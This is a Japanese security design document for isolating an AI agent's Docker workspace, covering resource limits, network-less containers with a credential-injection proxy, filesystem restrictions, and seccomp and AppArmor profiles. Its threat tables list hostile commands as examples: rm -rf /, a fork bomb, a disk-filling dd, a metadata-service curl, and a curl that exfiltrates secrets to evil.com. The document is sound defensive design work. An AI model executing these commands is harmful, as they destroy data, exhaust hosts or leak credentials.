# 04 - セキュリティ設計

## 多層防御アーキテクチャ

Anthropic 公式セキュアデプロイメントガイドに準拠した多層防御構成。

```
Layer 1: Docker コンテナ隔離 (namespace, cgroups)
Layer 2: Linux Security Modules (seccomp, AppArmor)     ← Phase 1 から有効
Layer 3: リソース制限 (CPU, Memory, Disk, PIDs)          ← Phase 1 から有効
Layer 4: ネットワーク完全排除 (--network none)           ← Phase 1 から有効
Layer 5: ファイルシステム制限 (read-only root + noexec tmpfs)
Layer 6: 認証情報隔離 (Proxy ベース注入、コンテナ内に認証情報なし)
Layer 7: ユーザー名前空間分離 (userns-remap)
```

## リソース制限

### コンテナリソース設定（公式推奨値準拠）

```python
RESOURCE_LIMITS: dict[str, int | str] = {
    # CPU: 2 cores
    "cpu_period": 100000,
    "cpu_quota": 200000,

    # メモリ: 2GB (swap 無効)
    # Anthropic 公式推奨: 1GiB RAM（最小）
    # データ分析ワークロードを考慮して 2GB に設定
    "mem_limit": "2g",
    "memswap_limit": "2g",

    # プロセス数: フォークボム対策
    # Anthropic 公式推奨: 100
    "pids_limit": 100,

    # ディスク: overlay2 + XFS pquota 環境で有効
    "storage_opt": {"size": "5G"},
}
```

### 各制限の理由

| 制限 | 値 | 公式推奨 | 脅威 | 効果 |
|------|-----|----------|------|------|
| CPU 2 cores | `cpu_quota=200000` | 1 CPU〜 | 無限ループ、暗号マイニング | CPU 独占を防止 |
| Memory 2GB | `mem_limit=2g` | 1GiB〜 | メモリリーク、大量データ処理 | OOM Killer が発動 |
| Swap 無効 | `memswap_limit=2g` | - | swap 使用によるホスト劣化 | メモリ超過で即停止 |
| PIDs 100 | `pids_limit=100` | 100 | フォークボム `:(){ :\|:& };:` | プロセス数を制限 |
| Disk 5GB | `storage_opt size=5G` | 5GiB | 大量ファイル生成、core dump | ディスク消費を制限 |

> **メモリ 2GB の根拠**: 公式推奨の最小値は 1GiB だが、本システムでは pandas/numpy 等の
> データ分析ライブラリがプリインストールされているため、2GB に設定。
> 実際のワークロードでプロファイリングし、必要に応じて調整する。

### ディスククォータの実現方法

| ホスト FS | 方法 | 設定 |
|-----------|------|------|
| **XFS + pquota** | ネイティブ対応 | `--storage-opt size=5G` がそのまま動作 |
| **ext4** | Loopback XFS ファイル | XFS フォーマットのファイルを `/var/lib/docker` にマウント |

```bash
# ext4 環境での loopback XFS セットアップ
dd if=/dev/zero of=/var/lib/docker.xfs bs=1 count=0 seek=200G
mkfs.xfs /var/lib/docker.xfs
mount -o loop,pquota /var/lib/docker.xfs /var/lib/docker
# → これで --storage-opt size=5G が使える
```

## ネットワーク隔離

### `--network none` + Unix Socket Proxy（Phase 1 から適用）

Anthropic 公式セキュアデプロイメントガイドで推奨される最も安全な構成を Phase 1 から採用する。

```
┌─ Host ──────────────────────────────────────────────┐
│                                                       │
│  ┌─ backend-network (bridge) ──────────────────────┐ │
│  │  Backend, PostgreSQL, Redis                      │ │
│  │  Credential Injection Proxy                      │ │
│  └──────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ Workspace Container (--network none) ──────────┐ │
│  │  ネットワークインターフェースなし                  │ │
│  │  ※ IP アドレスなし、ソケットなし                  │ │
│  │  ※ 唯一の通信手段: マウントされた Unix Socket    │ │
│  │                                                   │ │
│  │  /var/run/proxy.sock → Host 上の Proxy に接続    │ │
│  └───────────────────────────────────────────────────┘ │
│                                                       │
│  ┌─ Credential Injection Proxy ─────────────────────┐ │
│  │  Unix Socket で listen                            │ │
│  │  ├─ ドメインホワイトリスト適用                     │ │
│  │  ├─ AWS SigV4 署名注入（Bedrock API 用）          │ │
│  │  ├─ 全リクエストを監査ログに記録                   │ │
│  │  └─ 許可された宛先にのみ転送                      │ │
│  └───────────────────────────────────────────────────┘ │
└───────────────────────────────────────────────────────┘
```

**利点（Squid + 制限付きネットワーク方式との比較）:**

| 比較項目 | `--network none` + Unix Socket | 制限付きネットワーク + Squid |
|----------|-------------------------------|----------------------------|
| 攻撃面 | 最小（ネットワークスタックなし） | ネットワークスタック全体が攻撃面 |
| 認証情報保護 | コンテナ内に一切なし | Docker Secrets でファイルとして存在 |
| 設定の複雑さ | Unix Socket マウントのみ | iptables + Squid + SNI設定 |
| 運用コスト | プロキシプロセスのみ | Squid コンテナ + iptables管理 |
| バイパスリスク | なし（ネットワークIF自体がない） | iptables ルール漏れのリスク |

### ドメインホワイトリスト

Proxy がリクエスト転送前に適用するホワイトリスト:

```python
DOMAIN_WHITELIST: list[str] = [
    # パッケージレジストリ
    "pypi.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
    # Anthropic / Bedrock API
    "api.anthropic.com",
    "bedrock-runtime.us-east-1.amazonaws.com",
    "bedrock-runtime.us-west-2.amazonaws.com",
    "bedrock-runtime.ap-northeast-1.amazonaws.com",
]
```

### メタデータサービスへのアクセス遮断

`--network none` により、EC2 メタデータサービス（`169.254.169.254`）への
アクセスは原理的に不可能。追加の iptables ルールは不要。

### Phase 2: gVisor によるカーネルレベル隔離

`--network none` + Unix Socket 構成は維持しつつ、gVisor (runsc) でカーネルレベルの隔離を追加:

```bash
docker run --runtime=runsc --network none ...
```

## ファイルシステム保護

### Read-Only Root + noexec tmpfs

```python
FILESYSTEM_CONFIG: dict = {
    "read_only": True,
    "tmpfs": {
        # /tmp: noexec（公式推奨準拠）
        # プリインストール済みライブラリで C 拡張ビルド不要
        "/tmp": "rw,noexec,nosuid,size=512M",
        "/var/tmp": "rw,noexec,nosuid,size=256M",
        "/run": "rw,noexec,nosuid,size=64M",
        # pip キャッシュ
        "/home/appuser/.cache": "rw,noexec,nosuid,size=512M",
        "/home/appuser": "rw,noexec,nosuid,size=64M",
    },
    # /workspace と /opt/venv はエフェメラル Docker Volume
}
```

### ディレクトリ権限

| パス | 権限 | マウント方式 | 説明 |
|------|------|------------|------|
| `/` (root) | read-only | イメージレイヤー | システムファイル保護 |
| `/workspace` | read-write | エフェメラルボリューム | ユーザーファイル領域 |
| `/opt/venv` | read-write | エフェメラルボリューム | pip install 先 |
| `/tmp` | read-write, **noexec** | tmpfs (512MB) | 一時ファイル（実行不可） |
| `/home/appuser/.cache` | read-write, noexec | tmpfs (512MB) | pip キャッシュ |
| `/home/appuser` | read-write, noexec | tmpfs (64MB) | ホームディレクトリ |

> **`/tmp` noexec の影響**: ソースビルドが必要なパッケージ（C 拡張等）の `pip install` が
> コンテナ内で失敗する可能性がある。これは意図した動作であり、ベースイメージに
> プリインストールすることで対処する。ユーザーが追加で `pip install` できるのは
> pure Python パッケージまたはホイール配布のパッケージに限定される。

## コンテナセキュリティオプション

### Phase 1 から適用する全セキュリティ設定

```python
SECURITY_CONFIG: dict = {
    # --- Capability 制御 ---
    # 全 Capability をドロップし、必要最小限のみ追加
    "cap_drop": ["ALL"],
    "cap_add": ["CHOWN", "SETUID", "SETGID", "DAC_OVERRIDE"],

    # --- 権限昇格の禁止 ---
    "security_opt": [
        "no-new-privileges:true",
        # Docker デフォルト seccomp プロファイル
        # 44 個の危険な syscall をブロック（mount, reboot, etc.）
        # Phase 2 でカスタムプロファイルに移行
    ],

    # --- 特権モード禁止 ---
    "privileged": False,

    # --- IPC 隔離 ---
    "ipc_mode": "private",

    # --- ネットワーク完全排除 ---
    "network_mode": "none",
}
```

### userns-remap（デーモンレベル設定）

Anthropic 公式ガイドで推奨される追加の強化オプション。
コンテナ内の root がホスト上の非特権ユーザーにマッピングされ、
コンテナエスケープ時の被害を制限する。

```json
// /etc/docker/daemon.json
{
  "userns-remap": "default",
  "storage-driver": "overlay2",
  "storage-opts": [
    "overlay2.override_kernel_check=true"
  ]
}
```

> **注意**: `userns-remap` は全コンテナに影響するデーモンレベルの設定。
> 既存コンテナとの互換性を確認した上で有効化すること。

### Phase 2: カスタム seccomp プロファイル

Docker デフォルトより厳格な seccomp プロファイルを適用:

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": [
        "read", "write", "open", "close", "stat", "fstat",
        "lstat", "poll", "lseek", "mmap", "mprotect",
        "munmap", "brk", "ioctl", "access", "pipe",
        "select", "sched_yield", "mremap", "msync",
        "clone", "fork", "vfork", "execve",
        "exit", "exit_group", "wait4",
        "socket", "connect", "sendto", "recvfrom",
        "bind", "listen", "accept", "getsockname",
        "getpid", "getuid", "getgid", "geteuid", "getegid",
        "getcwd", "chdir", "rename", "mkdir", "rmdir",
        "unlink", "readlink", "chmod", "chown",
        "futex", "epoll_create", "epoll_ctl", "epoll_wait"
      ],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

### Phase 3: AppArmor プロファイル

```
#include <tunables/global>

profile workspace-container flags=(attach_disconnected) {
  #include <abstractions/base>

  # ワークスペースへのフルアクセス
  /workspace/** rw,

  # venv へのフルアクセス
  /opt/venv/** rw,

  # /tmp への読み書き（実行不可はマウントオプションで制御）
  /tmp/** rw,

  # システムファイルの読み取りのみ
  /usr/** r,
  /lib/** r,
  /etc/** r,

  # 機密ファイルへのアクセスを明示的に拒否
  deny /proc/*/mem r,
  deny /sys/** w,
}
```

## 認証情報隔離

### 方針: コンテナ内に認証情報を一切持たせない

Anthropic 公式推奨の **Proxy パターン** を Phase 1 から採用する。

| 方式 | セキュリティ | 実装コスト | Phase 1 採用 |
|------|------------|-----------|-------------|
| **環境変数** | 低（`env` コマンドで漏洩） | 最低 | × |
| **Docker Secrets** | 中（ファイルとして存在、`cat` で読取可能） | 低 | × |
| **Proxy 注入** | 高（コンテナ内に認証情報なし） | 中 | **○** |

```
エージェントが Bedrock API を呼び出す場合:

1. SDK が ANTHROPIC_BASE_URL (Unix Socket) にリクエスト送信
2. Credential Injection Proxy がリクエストを受信
3. Proxy が AWS SigV4 署名を生成してヘッダーに注入
4. Proxy が bedrock-runtime.*.amazonaws.com に転送
5. レスポンスを Proxy → Unix Socket → SDK に返却

※ コンテナ内のプロセスが認証情報にアクセスする手段は存在しない
```

## 破壊的コマンドへの対策まとめ

| 攻撃 | 対策 | Layer |
|------|------|-------|
| `rm -rf /` | read-only root filesystem | L5 |
| `:(){ :\|:& };:` (fork bomb) | `pids_limit=100` | L3 |
| `dd if=/dev/zero of=/fill bs=1M` | disk quota 5GB | L3 |
| `python -c "a='x'*10**10"` | `mem_limit=2g` → OOM Killer | L3 |
| `while true; do :; done` | `cpu_quota=200000` (2 cores) | L3 |
| `curl http://169.254.169.254/` | `--network none`（ネットワークIF自体がない） | L4 |
| `psql -h db-host` | `--network none`（DNS解決も不可） | L4 |
| `pip install malicious-pkg` | Proxy ドメインホワイトリスト（PyPI のみ許可） | L4 |
| `env` で認証情報取得 | 認証情報がコンテナ内に存在しない（Proxy 注入） | L6 |
| `curl https://evil.com -d @/secret` | `--network none`（外部通信不可） | L4 |
| `./exploit` (権限昇格) | seccomp + no-new-privileges + userns-remap | L2, L7 |
| コンテナエスケープ | userns-remap でホスト権限なし | L7 |